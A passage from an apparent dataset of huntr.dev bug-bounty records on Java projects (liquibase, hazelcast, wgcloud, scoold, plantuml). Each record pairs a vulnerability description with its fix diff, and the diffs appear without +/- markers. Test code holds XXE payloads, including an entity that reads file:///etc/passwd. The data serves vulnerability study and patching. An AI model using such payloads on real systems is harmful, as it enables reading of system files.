                SAXParser saxp = SAXParserFactory.newInstance().newSAXParser();
                SAXParserFactory parserFactory = SAXParserFactory.newInstance();
                parserFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
                SAXParser parser = parserFactory.newSAXParser();

                final String prefix = entry.getKey();
                saxp.parse(entry.getValue(), new DefaultHandler() {
                parser.parse(entry.getValue(), new DefaultHandler() {
                    @Override
                    public void startElement(String uri, String localName, String qName,
                                             Attributes attr) throws SAXException {"
https://huntr.dev/bounties/10bf77c6-4973-4915-a761-a12d15715303/,Auth bypass via unproper use of getRequestURL() in tianshiyeben/wgcloud,"The wgcloud uses getRequestURL() improperly, an attacker could craft an URL that bypasses the auth of wgcloud",,CWE-939: Improper Authorization in Handler for Custom URL Scheme,https://www.github.com/tianshiyeben/wgcloud/commit/91f7cb34e4145774f382c33062bfa4758ba1c014,"@@ -31,8 +31,7 @@ public class AuthRestFilter implements Filter {
    @Autowired
    CommonConfig commonConfig;

    String[] static_resource = {""/agent/minTask"", ""/agentGo/minTask"", ""login/toLogin"", ""login/login"", ""appInfo/agentList"",
            ""/code/get"", "".css"", "".js"", "".jpg"", "".png"", "".ico"", "".gif"", ""font"", "".eot"", "".woff"", "".svg"", "".ttf"", "".woff2""};

    String[] dash_views = {""/dash/main"", ""/dash/systemInfoList"", ""/dash/detail"", ""/dash/chart""};

@@ -42,18 +41,20 @@ public void doFilter(ServletRequest servletRequest, ServletResponse servletRespo
        final HttpServletRequest request = (HttpServletRequest) servletRequest;
        final HttpSession session = request.getSession();
        AccountInfo accountInfo = (AccountInfo) session.getAttribute(StaticKeys.LOGIN_KEY);
        String uri = request.getRequestURL().toString();
//        log.info(""uri----"" + request.getRequestURL());


        menuActive(session, uri);
        for (String ss : static_resource) {
            if (uri.indexOf(ss) != -1) {
                filterChain.doFilter(servletRequest, servletResponse);
                return;
            }
        }
        if (accountInfo == null) {
            for (String ss : dash_views) {
                if (uri.indexOf(ss) != -1 && ""true"".equals(commonConfig.getDashView()) && request.getParameter(StaticKeys.DASH_VIEW_ACCOUNT) != null) {
                    filterChain.doFilter(servletRequest, servletResponse);
                    return;
                }

","13
wgcloud-server/src/main/java/com/wgcloud/filter/AuthRestFilter.java
@@ -31,8 +31,7 @@ public class AuthRestFilter implements Filter {
    @Autowired
    CommonConfig commonConfig;

    String[] static_resource = {""/agent/minTask"", ""/agentGo/minTask"", ""login/toLogin"", ""login/login"", ""appInfo/agentList"",
            ""/code/get"", "".css"", "".js"", "".jpg"", "".png"", "".ico"", "".gif"", ""font"", "".eot"", "".woff"", "".svg"", "".ttf"", "".woff2""};
    String[] static_resource = {""/agent/minTask"", ""/agentGo/minTask"", ""/login/toLogin"", ""/login/login"", ""/appInfo/agentList"", ""/static/""};

    String[] dash_views = {""/dash/main"", ""/dash/systemInfoList"", ""/dash/detail"", ""/dash/chart""};

@@ -42,18 +41,20 @@ public void doFilter(ServletRequest servletRequest, ServletResponse servletRespo
        final HttpServletRequest request = (HttpServletRequest) servletRequest;
        final HttpSession session = request.getSession();
        AccountInfo accountInfo = (AccountInfo) session.getAttribute(StaticKeys.LOGIN_KEY);
        String uri = request.getRequestURL().toString();
//        log.info(""uri----"" + request.getRequestURL());
        String uri = request.getRequestURI();
        log.debug(""uri----"" + uri);
        String servletPath = request.getServletPath();
        log.debug(""servletPath----"" + servletPath);
        menuActive(session, uri);
        for (String ss : static_resource) {
            if (uri.indexOf(ss) != -1) {
            if (servletPath.startsWith(ss)) {
                filterChain.doFilter(servletRequest, servletResponse);
                return;
            }
        }
        if (accountInfo == null) {
            for (String ss : dash_views) {
                if (uri.indexOf(ss) != -1 && ""true"".equals(commonConfig.getDashView()) && request.getParameter(StaticKeys.DASH_VIEW_ACCOUNT) != null) {
                if (servletPath.startsWith(ss) && ""true"".equals(commonConfig.getDashView()) && request.getParameter(StaticKeys.DASH_VIEW_ACCOUNT) != null) {
                    filterChain.doFilter(servletRequest, servletResponse);
                    return;
                }"
https://huntr.dev/bounties/1a2486ea-53ac-4834-ae8e-e837da162ed3/,Insecure Storage of Sensitive Information in erudika/scoold,"When the user uploads his profile picture, the uploaded image’s EXIF Geolocation Data does not get stripped. As a result, anyone can get sensitive information of Scoold users like their Geolocation, their Device information like Device Name, Version, Software & Software version used, etc.",,CWE-922: Insecure Storage of Sensitive Information,https://www.github.com/erudika/scoold/commit/0d2dd37a6ca9220c204f17e70116fc9880847148,"@@ -142,7 +142,7 @@
  <dependency>
   <groupId>com.cloudinary</groupId>
   <artifactId>cloudinary-http45</artifactId>
   <version>1.31.0</version>
  </dependency>
  <dependency>
   <groupId>com.github.dfabulich</groupId>

","2
pom.xml
@@ -142,7 +142,7 @@
  <dependency>
   <groupId>com.cloudinary</groupId>
   <artifactId>cloudinary-http45</artifactId>
   <version>1.31.0</version>
   <version>1.32.1</version>
  </dependency>
  <dependency>
   <groupId>com.github.dfabulich</groupId>"
https://huntr.dev/bounties/9889d435-3b9c-4e9d-93bc-5272e0723f9f/,Improper handling of Length parameter in erudika/scoold,There was no restriction on the amount of text that can be inserted into a user's name field. When the text size was large enough the service resulted in a momentary outage in our non-production environment (not high availability). An internal reproduction showed isolated disruption but no outage in our production environment.,CVE-2022-1543,CWE-130: Improper Handling of Length Parameter Inconsistency,https://www.github.com/erudika/scoold/commit/62a0e92e1486ddc17676a7ead2c07ff653d167ce,"@@ -240,7 +240,7 @@ private boolean updateUserPictureAndName(Profile showUser, String picture, Strin
  }

  if (CONF.nameEditsEnabled() && !StringUtils.isBlank(name)) {
   showUser.setName(name);
   if (StringUtils.isBlank(showUser.getOriginalName())) {
    showUser.setOriginalName(name);
   }

@@ -443,7 +443,7 @@ public String getOriginalName() {
 }

 public void setOriginalName(String originalName) {
  this.originalName = originalName;
 }

 public String getOriginalPicture() {

@@ -345,7 +345,7 @@ private boolean updateProfilePictureAndName(Profile authUser, User u) {
   update = true;
  }
  if (!CONF.nameEditsEnabled() && !StringUtils.equals(u.getName(), authUser.getName())) {
   authUser.setName(u.getName());
   update = true;
  }
  if (!StringUtils.equals(u.getName(), authUser.getOriginalName())) {

","2
src/main/java/com/erudika/scoold/controllers/ProfileController.java
@@ -240,7 +240,7 @@ private boolean updateUserPictureAndName(Profile showUser, String picture, Strin
  }

  if (CONF.nameEditsEnabled() && !StringUtils.isBlank(name)) {
   showUser.setName(name);
   showUser.setName(StringUtils.abbreviate(name, 256));
   if (StringUtils.isBlank(showUser.getOriginalName())) {
    showUser.setOriginalName(name);
   }
2
src/main/java/com/erudika/scoold/core/Profile.java
@@ -443,7 +443,7 @@ public String getOriginalName() {
 }

 public void setOriginalName(String originalName) {
  this.originalName = originalName;
  this.originalName = StringUtils.abbreviate(originalName, 256);
 }

 public String getOriginalPicture() {
2
src/main/java/com/erudika/scoold/utils/ScooldUtils.java
@@ -345,7 +345,7 @@ private boolean updateProfilePictureAndName(Profile authUser, User u) {
   update = true;
  }
  if (!CONF.nameEditsEnabled() && !StringUtils.equals(u.getName(), authUser.getName())) {
   authUser.setName(u.getName());
   authUser.setName(StringUtils.abbreviate(u.getName(), 256));
   update = true;
  }
  if (!StringUtils.equals(u.getName(), authUser.getOriginalName())) {"
https://huntr.dev/bounties/27db9509-6cd3-4148-8d70-5942f3837604/,XSS via Embedded SVG in SVG Diagram Format in plantuml/plantuml,"It is possible to embed SVG images in diagrams. When those are exported or used in a diagram in SVG format, the content of the embedded SVG image is included inline. This means the SVG markup gets inserted directly into the markup of the enclosing SVG.",CVE-2022-1231,CWE-79: Cross-site Scripting (XSS) - Stored,https://www.github.com/plantuml/plantuml/commit/c9137be051ce98b3e3e27f65f54ec7d9f8886903,"@@ -52,15 +52,15 @@ public UImageSvg(String svg, double scale) {
  this.scale = scale;
 }

 private String clean(String svg) {
  svg = svg.toLowerCase().replaceAll(""\\s"", """");
  if (svg.contains(""<script>""))
   return EMPTY_SVG;
  if (svg.contains(""</script>""))
   return EMPTY_SVG;
  if (svg.contains(""<foreignobject""))
   return EMPTY_SVG;
  if (svg.contains(""</foreignobject>""))
   return EMPTY_SVG;
  return svg;
 }

","12
src/net/sourceforge/plantuml/ugraphic/UImageSvg.java
@@ -52,15 +52,15 @@ public UImageSvg(String svg, double scale) {
  this.scale = scale;
 }

 private String clean(String svg) {
  svg = svg.toLowerCase().replaceAll(""\\s"", """");
  if (svg.contains(""<script>""))
 private String clean(final String svg) {
  final String svg2 = svg.toLowerCase().replaceAll(""\\s"", """");
  if (svg2.contains(""<script>""))
   return EMPTY_SVG;
  if (svg.contains(""</script>""))
  if (svg2.contains(""</script>""))
   return EMPTY_SVG;
  if (svg.contains(""<foreignobject""))
  if (svg2.contains(""<foreignobject""))
   return EMPTY_SVG;
  if (svg.contains(""</foreignobject>""))
  if (svg2.contains(""</foreignobject>""))
   return EMPTY_SVG;
  return svg;
 }"
https://huntr.dev/bounties/f1ae5779-b406-4594-a8a3-d089c68d6e70/,Improper Restriction of XML External Entity Reference in liquibase/liquibase,"The XMLChangeLogSAXParser() function makes use of SAXParser generated from a SAXParserFactory with no FEATURE_SECURE_PROCESSING set, allowing for XXE attacks. In https://github.com/liquibase/liquibase/blob/6f3bb08572b2dcec2d8220b10d49ceb64c4d800a/liquibase-core/src/main/java/liquibase/parser/core/xml/XMLChangeLogSAXParser.java#L24-L27",CVE-2022-0839,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/liquibase/liquibase/commit/33d9d925082097fb1a3d2fc8e44423d964cd9381,"@@ -23,7 +23,7 @@ class XMLChangeLogSAXParserTest extends Specification {

    def INSECURE_XML = """"""
<!DOCTYPE databaseChangeLog [
        <!ENTITY insecure SYSTEM ""https://localhost/insecure"">
        ]>

<databaseChangeLog xmlns=""http://www.liquibase.org/xml/ns/dbchangelog""
@@ -83,7 +83,7 @@ class XMLChangeLogSAXParserTest extends Specification {

        then:
        def e = thrown(ChangeLogParseException)
        e.message.contains(""Failed to read external document 'insecure'"")
    }

    def ""allows liquibase.secureParsing=false to disable secure parsing""() {
@@ -97,7 +97,7 @@ class XMLChangeLogSAXParserTest extends Specification {

        then:
        def e = thrown(ChangeLogParseException)
        e.message.contains(""Connection refused"")
    }

}
","6
liquibase-core/src/test/groovy/liquibase/parser/core/xml/XMLChangeLogSAXParserTest.groovy
@@ -23,7 +23,7 @@ class XMLChangeLogSAXParserTest extends Specification {

    def INSECURE_XML = """"""
<!DOCTYPE databaseChangeLog [
        <!ENTITY insecure SYSTEM ""https://localhost/insecure"">
        <!ENTITY insecure SYSTEM ""file://invalid.txt"">
        ]>
<databaseChangeLog xmlns=""http://www.liquibase.org/xml/ns/dbchangelog""
@@ -83,7 +83,7 @@ class XMLChangeLogSAXParserTest extends Specification {

        then:
        def e = thrown(ChangeLogParseException)
        e.message.contains(""Failed to read external document 'insecure'"")
        e.message.contains(""access is not allowed due to restriction set by the accessExternalDTD property"")
    }

    def ""allows liquibase.secureParsing=false to disable secure parsing""() {
@@ -97,7 +97,7 @@ class XMLChangeLogSAXParserTest extends Specification {

        then:
        def e = thrown(ChangeLogParseException)
        e.message.contains(""Connection refused"")
        e.message.contains(""Error Reading Changelog File: invalid.txt"")
    }

}"
https://huntr.dev/bounties/d63972a2-b910-480a-a86b-d1f75d24d563/,Improper Restriction of XML External Entity Reference in hazelcast/hazelcast,"The AbstractXmlConfigRootTagRecognizer() function makes use of SAXParser generated from a SAXParserFactory with no FEATURE_SECURE_PROCESSING set, allowing for XXE attacks. In https://github.com/hazelcast/hazelcast/blob/f373d8e05f0258a8e5e817a46b16ed4e32278bd3/hazelcast/src/main/java/com/hazelcast/internal/config/AbstractXmlConfigRootTagRecognizer.java#L56-L65",CVE-2022-0265,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/hazelcast/hazelcast/commit/4d6b666cd0291abd618c3b95cdbb51aa4208e748,"@@ -18,6 +18,7 @@

import com.hazelcast.config.ConfigRecognizer;
import com.hazelcast.config.ConfigStream;

import com.hazelcast.logging.ILogger;
import com.hazelcast.logging.Logger;
import org.xml.sax.Attributes;
@@ -54,7 +55,7 @@ public class AbstractXmlConfigRootTagRecognizer implements ConfigRecognizer {

    public AbstractXmlConfigRootTagRecognizer(String expectedRootNode) throws Exception {
        this.expectedRootNode = expectedRootNode;
        SAXParserFactory factory = SAXParserFactory.newInstance();
        saxParser = factory.newSAXParser();
    }


@@ -25,6 +25,8 @@
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;


import javax.xml.transform.ErrorListener;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Source;
@@ -41,7 +43,10 @@
import com.hazelcast.logging.Logger;

/**
 * Utility class for XML processing.



 */
public final class XmlUtil {

@@ -55,6 +60,7 @@ public final class XmlUtil {
     */
    public static final String SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES = ""hazelcast.ignoreXxeProtectionFailures"";


    private static final ILogger LOGGER = Logger.getLogger(XmlUtil.class);

    private XmlUtil() {
@@ -68,7 +74,7 @@ private XmlUtil() {
    public static DocumentBuilderFactory getNsAwareDocumentBuilderFactory() throws ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setNamespaceAware(true);
        setFeature(dbf, ""http://apache.org/xml/features/disallow-doctype-decl"");
        return dbf;
    }

@@ -92,6 +98,24 @@ public static SchemaFactory getSchemaFactory() throws SAXException {
        return schemaFactory;
    }



















    /**
     * Formats given XML String with the given indentation used. If the {@code input} XML string is {@code null}, or
     * {@code indent} parameter is negative, or XML transformation fails, then the original value is returned unchanged. The
@@ -166,62 +190,63 @@ static void setAttribute(TransformerFactory transformerFactory, String attribute
        try {
            transformerFactory.setAttribute(attributeName, """");
        } catch (IllegalArgumentException iae) {
            if (Boolean.getBoolean(SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES)) {
                LOGGER.warning(""Enabling XXE protection failed. The attribute "" + attributeName
                        + "" is not supported by the TransformerFactory. The "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property is used so the XML processing continues in the UNSECURE mode""
                        + "" with XXE protection disabled!!!"");
            } else {
                LOGGER.severe(""Enabling XXE protection failed. The attribute "" + attributeName
                        + "" is not supported by the TransformerFactory. This usually mean an outdated XML processor""
                        + "" is present on the classpath (e.g. Xerces, Xalan). If you are not able to resolve the issue by""
                        + "" fixing the classpath, the "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property can be used to disable XML External Entity protections.""
                        + "" We don't recommend disabling the XXE as such the XML processor configuration is unsecure!!!"", iae);
                throw iae;
            }
        }
    }

    static void setFeature(DocumentBuilderFactory dbf, String featureName) throws ParserConfigurationException {
        try {
            dbf.setFeature(featureName, true);
        } catch (ParserConfigurationException e) {
            if (Boolean.getBoolean(SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES)) {
                LOGGER.warning(""Enabling XXE protection failed. The feature "" + featureName
                        + "" is not supported by the DocumentBuilderFactory. The "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property is used so the XML processing continues in the UNSECURE mode""
                        + "" with XXE protection disabled!!!"");
            } else {
                LOGGER.severe(""Enabling XXE protection failed. The feature "" + featureName
                        + "" is not supported by the DocumentBuilderFactory. This usually mean an outdated XML processor""
                        + "" is present on the classpath (e.g. Xerces, Xalan). If you are not able to resolve the issue by""
                        + "" fixing the classpath, the "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property can be used to disable XML External Entity protections.""
                        + "" We don't recommend disabling the XXE as such the XML processor configuration is unsecure!!!"", e);
                throw e;
            }
        }
    }

    static void setProperty(SchemaFactory schemaFactory, String propertyName) throws SAXException {
        try {
            schemaFactory.setProperty(propertyName, """");
        } catch (SAXException e) {
            if (Boolean.getBoolean(SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES)) {
                LOGGER.warning(""Enabling XXE protection failed. The property "" + propertyName
                        + "" is not supported by the SchemaFactory. The "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property is used so the XML processing continues in the UNSECURE mode""
                        + "" with XXE protection disabled!!!"");
            } else {
                LOGGER.severe(""Enabling XXE protection failed. The property "" + propertyName
                        + "" is not supported by the SchemaFactory. This usually mean an outdated XML processor""
                        + "" is present on the classpath (e.g. Xerces, Xalan). If you are not able to resolve the issue by""
                        + "" fixing the classpath, the "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property can be used to disable XML External Entity protections.""
                        + "" We don't recommend disabling the XXE as such the XML processor configuration is unsecure!!!"", e);
                throw e;
            }
















        }
    }


@@ -18,19 +18,39 @@

import static com.hazelcast.internal.util.XmlUtil.SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES;
import static com.hazelcast.internal.util.XmlUtil.format;


import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertThrows;









import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;





import javax.xml.transform.TransformerFactory;
import javax.xml.validation.SchemaFactory;





import org.junit.Rule;
import org.junit.Test;
import org.junit.experimental.categories.Category;
import org.junit.runner.RunWith;

import org.xml.sax.SAXException;

import com.hazelcast.test.HazelcastSerialClassRunner;
@@ -45,6 +65,30 @@ public class XmlUtilTest {
    public OverridePropertyRule ignoreXxeFailureProp = OverridePropertyRule
            .clear(SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES);

























    @Test
    public void testFormat() throws Exception {
        assertEquals(""<a> <b>c</b></a>"", format(""<a><b>c</b></a>"", 1).replaceAll(""[\r\n]"", """"));
@@ -54,9 +98,9 @@ public void testFormat() throws Exception {
        assertThrows(IllegalArgumentException.class, () -> format(""<a><b>c</b></a>"", 0));

        // check if the XXE protection is enabled
        String xxeAttack = ""<?xml version=\""1.0\"" encoding=\""utf-8\""?>\n"" + ""  <!DOCTYPE test [\n""
                + ""    <!ENTITY xxe SYSTEM \""file:///etc/passwd\"">\n"" + ""  ]>"" + ""<a><b>&xxe;</b></a>"";
        assertEquals(xxeAttack, format(xxeAttack, 1));

        // wrongly formatted XML
        assertEquals(""<a><b>c</b><a>"", format(""<a><b>c</b><a>"", 1));
@@ -94,4 +138,99 @@ public void testGetDocumentBuilderFactory() throws Exception {
        ignoreXxeFailureProp.setOrClearProperty(""true"");
        XmlUtil.setFeature(dbf, ""test://no-such-feature"");
    }































































































}
","3
...lcast/src/main/java/com/hazelcast/internal/config/AbstractXmlConfigRootTagRecognizer.java
@@ -18,6 +18,7 @@

import com.hazelcast.config.ConfigRecognizer;
import com.hazelcast.config.ConfigStream;
import com.hazelcast.internal.util.XmlUtil;
import com.hazelcast.logging.ILogger;
import com.hazelcast.logging.Logger;
import org.xml.sax.Attributes;
@@ -54,7 +55,7 @@ public class AbstractXmlConfigRootTagRecognizer implements ConfigRecognizer {

    public AbstractXmlConfigRootTagRecognizer(String expectedRootNode) throws Exception {
        this.expectedRootNode = expectedRootNode;
        SAXParserFactory factory = SAXParserFactory.newInstance();
        SAXParserFactory factory = XmlUtil.getSAXParserFactory();
        saxParser = factory.newSAXParser();
    }

113
hazelcast/src/main/java/com/hazelcast/internal/util/XmlUtil.java
@@ -25,6 +25,8 @@
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLInputFactory;
import javax.xml.transform.ErrorListener;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Source;
@@ -41,7 +43,10 @@
import com.hazelcast.logging.Logger;

/**
 * Utility class for XML processing.
 * Utility class for XML processing. It contains several methods to retrieve XML processing factories with XXE protection
 * enabled (based on recommendation in the
 * <a href=""https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"">OWASP XXE prevention
 * cheat-sheet</a>).
 */
public final class XmlUtil {

@@ -55,6 +60,7 @@ public final class XmlUtil {
     */
    public static final String SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES = ""hazelcast.ignoreXxeProtectionFailures"";

    private static final String FEATURES_DISALLOW_DOCTYPE = ""http://apache.org/xml/features/disallow-doctype-decl"";
    private static final ILogger LOGGER = Logger.getLogger(XmlUtil.class);

    private XmlUtil() {
@@ -68,7 +74,7 @@ private XmlUtil() {
    public static DocumentBuilderFactory getNsAwareDocumentBuilderFactory() throws ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setNamespaceAware(true);
        setFeature(dbf, ""http://apache.org/xml/features/disallow-doctype-decl"");
        setFeature(dbf, FEATURES_DISALLOW_DOCTYPE);
        return dbf;
    }

@@ -92,6 +98,24 @@ public static SchemaFactory getSchemaFactory() throws SAXException {
        return schemaFactory;
    }

    /**
     * Returns {@link SAXParserFactory} with XXE protection enabled.
     */
    public static SAXParserFactory getSAXParserFactory() throws ParserConfigurationException, SAXException {
        SAXParserFactory factory = SAXParserFactory.newInstance();
        setFeature(factory, FEATURES_DISALLOW_DOCTYPE);
        return factory;
    }

    /**
     * Returns {@link XMLInputFactory} with XXE protection enabled.
     */
    public static XMLInputFactory getXMLInputFactory() {
        XMLInputFactory xmlInputFactory = XMLInputFactory.newInstance();
        setProperty(xmlInputFactory, XMLInputFactory.SUPPORT_DTD, false);
        return xmlInputFactory;
    }

    /**
     * Formats given XML String with the given indentation used. If the {@code input} XML string is {@code null}, or
     * {@code indent} parameter is negative, or XML transformation fails, then the original value is returned unchanged. The
@@ -166,62 +190,63 @@ static void setAttribute(TransformerFactory transformerFactory, String attribute
        try {
            transformerFactory.setAttribute(attributeName, """");
        } catch (IllegalArgumentException iae) {
            if (Boolean.getBoolean(SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES)) {
                LOGGER.warning(""Enabling XXE protection failed. The attribute "" + attributeName
                        + "" is not supported by the TransformerFactory. The "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property is used so the XML processing continues in the UNSECURE mode""
                        + "" with XXE protection disabled!!!"");
            } else {
                LOGGER.severe(""Enabling XXE protection failed. The attribute "" + attributeName
                        + "" is not supported by the TransformerFactory. This usually mean an outdated XML processor""
                        + "" is present on the classpath (e.g. Xerces, Xalan). If you are not able to resolve the issue by""
                        + "" fixing the classpath, the "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property can be used to disable XML External Entity protections.""
                        + "" We don't recommend disabling the XXE as such the XML processor configuration is unsecure!!!"", iae);
                throw iae;
            }
            printWarningAndRethrowEventually(iae, TransformerFactory.class, ""attribute "" + attributeName);
        }
    }

    static void setFeature(DocumentBuilderFactory dbf, String featureName) throws ParserConfigurationException {
        try {
            dbf.setFeature(featureName, true);
        } catch (ParserConfigurationException e) {
            if (Boolean.getBoolean(SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES)) {
                LOGGER.warning(""Enabling XXE protection failed. The feature "" + featureName
                        + "" is not supported by the DocumentBuilderFactory. The "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property is used so the XML processing continues in the UNSECURE mode""
                        + "" with XXE protection disabled!!!"");
            } else {
                LOGGER.severe(""Enabling XXE protection failed. The feature "" + featureName
                        + "" is not supported by the DocumentBuilderFactory. This usually mean an outdated XML processor""
                        + "" is present on the classpath (e.g. Xerces, Xalan). If you are not able to resolve the issue by""
                        + "" fixing the classpath, the "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property can be used to disable XML External Entity protections.""
                        + "" We don't recommend disabling the XXE as such the XML processor configuration is unsecure!!!"", e);
                throw e;
            }
            printWarningAndRethrowEventually(e, DocumentBuilderFactory.class, ""feature "" + featureName);
        }
    }

    static void setFeature(SAXParserFactory saxParserFactory, String featureName)
            throws ParserConfigurationException, SAXException {
        try {
            saxParserFactory.setFeature(featureName, true);
        } catch (SAXException e) {
            printWarningAndRethrowEventually(e, SAXParserFactory.class, ""feature "" + featureName);
        } catch (ParserConfigurationException e) {
            printWarningAndRethrowEventually(e, SAXParserFactory.class, ""feature "" + featureName);
        }
    }

    static void setProperty(SchemaFactory schemaFactory, String propertyName) throws SAXException {
        try {
            schemaFactory.setProperty(propertyName, """");
        } catch (SAXException e) {
            if (Boolean.getBoolean(SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES)) {
                LOGGER.warning(""Enabling XXE protection failed. The property "" + propertyName
                        + "" is not supported by the SchemaFactory. The "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property is used so the XML processing continues in the UNSECURE mode""
                        + "" with XXE protection disabled!!!"");
            } else {
                LOGGER.severe(""Enabling XXE protection failed. The property "" + propertyName
                        + "" is not supported by the SchemaFactory. This usually mean an outdated XML processor""
                        + "" is present on the classpath (e.g. Xerces, Xalan). If you are not able to resolve the issue by""
                        + "" fixing the classpath, the "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                        + "" system property can be used to disable XML External Entity protections.""
                        + "" We don't recommend disabling the XXE as such the XML processor configuration is unsecure!!!"", e);
                throw e;
            }
            printWarningAndRethrowEventually(e, SchemaFactory.class, ""property "" + propertyName);
        }
    }

    static void setProperty(XMLInputFactory xmlInputFactory, String propertyName, Object value) {
        try {
            xmlInputFactory.setProperty(propertyName, value);
        } catch (IllegalArgumentException e) {
            printWarningAndRethrowEventually(e, XMLInputFactory.class, ""property "" + propertyName);
        }
    }

    private static <T extends Exception> void printWarningAndRethrowEventually(T cause, Class<?> clazz, String objective)
            throws T {
        String className = clazz.getSimpleName();
        if (Boolean.getBoolean(SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES)) {
            LOGGER.warning(""Enabling XXE protection failed. The "" + objective + "" is not supported by the "" + className
                    + "". The "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                    + "" system property is used so the XML processing continues in the UNSECURE mode""
                    + "" with XXE protection disabled!!!"");
        } else {
            LOGGER.severe(
                    ""Enabling XXE protection failed. The "" + objective + "" is not supported by the "" + className
                            + "". This usually mean an outdated XML processor""
                            + "" is present on the classpath (e.g. Xerces, Xalan). If you are not able to resolve the issue by""
                            + "" fixing the classpath, the "" + SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES
                            + "" system property can be used to disable XML External Entity protections.""
                            + "" We don't recommend disabling the XXE as such the XML processor configuration is unsecure!"",
                    cause);
            throw cause;
        }
    }

145
hazelcast/src/test/java/com/hazelcast/internal/util/XmlUtilTest.java
@@ -18,19 +18,39 @@

import static com.hazelcast.internal.util.XmlUtil.SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES;
import static com.hazelcast.internal.util.XmlUtil.format;
import static java.nio.charset.StandardCharsets.UTF_8;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertThrows;

import java.io.IOException;
import java.io.StringReader;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicInteger;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLEventReader;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamException;
import javax.xml.transform.TransformerFactory;
import javax.xml.validation.SchemaFactory;

import org.fusesource.hawtbuf.ByteArrayInputStream;
import org.hamcrest.Matchers;
import org.junit.After;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.experimental.categories.Category;
import org.junit.runner.RunWith;
import org.xml.sax.HandlerBase;
import org.xml.sax.SAXException;

import com.hazelcast.test.HazelcastSerialClassRunner;
@@ -45,6 +65,30 @@ public class XmlUtilTest {
    public OverridePropertyRule ignoreXxeFailureProp = OverridePropertyRule
            .clear(SYSTEM_PROPERTY_IGNORE_XXE_PROTECTION_FAILURES);

    private DummyServer server;

    @Before
    public void before() throws IOException {
        server = new DummyServer();
        server.start();
    }

    @After
    public void after() {
        server.stop();
    }

    @Test
    public void testUnprotectedXxe() throws Exception {
        DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
        try {
            db.parse(new ByteArrayInputStream(server.getTestXml().getBytes(UTF_8)));
        } catch (Exception e) {
            // not important if it fails
        }
        assertThat(server.getHits(), Matchers.greaterThan(0));
    }

    @Test
    public void testFormat() throws Exception {
        assertEquals(""<a> <b>c</b></a>"", format(""<a><b>c</b></a>"", 1).replaceAll(""[\r\n]"", """"));
@@ -54,9 +98,9 @@ public void testFormat() throws Exception {
        assertThrows(IllegalArgumentException.class, () -> format(""<a><b>c</b></a>"", 0));

        // check if the XXE protection is enabled
        String xxeAttack = ""<?xml version=\""1.0\"" encoding=\""utf-8\""?>\n"" + ""  <!DOCTYPE test [\n""
                + ""    <!ENTITY xxe SYSTEM \""file:///etc/passwd\"">\n"" + ""  ]>"" + ""<a><b>&xxe;</b></a>"";
        assertEquals(xxeAttack, format(xxeAttack, 1));
        String xml = server.getTestXml();
        assertEquals(xml, format(xml, 1));
        assertEquals(0, server.getHits());

        // wrongly formatted XML
        assertEquals(""<a><b>c</b><a>"", format(""<a><b>c</b><a>"", 1));
@@ -94,4 +138,99 @@ public void testGetDocumentBuilderFactory() throws Exception {
